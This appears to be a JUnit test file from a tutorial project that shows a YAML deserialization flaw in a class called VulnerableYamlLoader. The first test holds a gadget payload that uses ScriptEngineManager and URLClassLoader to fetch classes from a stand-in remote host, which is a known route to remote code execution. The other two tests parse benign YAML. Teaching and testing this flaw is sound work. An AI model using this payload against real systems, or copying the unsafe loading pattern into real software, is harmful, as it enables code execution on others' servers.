package com.baeldung.boot;

import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

class VulnerableYamlLoaderTest {

    @Test
    void testVulnerableYamlLoader_Exploit() {
        // Example payload to demonstrate vulnerability
        String exploitPayload = "!!javax.script.ScriptEngineManager [  \n" +
                "     !!java.net.URLClassLoader [[  \n" +
                "          !!java.net.URL [\"http://dosattack/\"]  \n" +
                "     ]]  \n" +
                "]  ";

        VulnerableYamlLoader yamlLoader = new VulnerableYamlLoader();
        Object result = yamlLoader.loadYaml(exploitPayload);

        // Expecting a javax.scrip.ScriptEngineManager object to be deserialized
        assertNotNull(result);
        assertTrue(result instanceof javax.script.ScriptEngineManager,
                                    "The payload should deserialize into a ScriptEngineManager");
    }

    @Test
    void testVulnerableYamlLoader_SafeDeserialization() {
        // A safe and valid YAML payload
        String safePayload = "name: Test User\nage: 25";

        VulnerableYamlLoader yamlLoader = new VulnerableYamlLoader();
        Object result = yamlLoader.loadYaml(safePayload);

        // The result should be a Map (or a custom object depending on your YAML processing logic)
        assertNotNull(result);
        assertTrue(result instanceof java.util.Map, "The payload should deserialize into a Map object");
    }

    @Test
    void testVulnerableYamlLoader_NonExploit() {
        // Non-exploit YAML payload with simple data
        String nonExploitPayload = "name: Normal User\nrole: admin";

        VulnerableYamlLoader yamlLoader = new VulnerableYamlLoader();
        Object result = yamlLoader.loadYaml(nonExploitPayload);

        // The result should be a Map with the expected key-value pairs
        assertNotNull(result);
        assertTrue(result instanceof java.util.Map, "The payload should deserialize into a Map object");
        java.util.Map<?, ?> resultMap = (java.util.Map<?, ?>) result;
        assertTrue(resultMap.containsKey("name"));
        assertTrue(resultMap.containsKey("role"));
    }

}
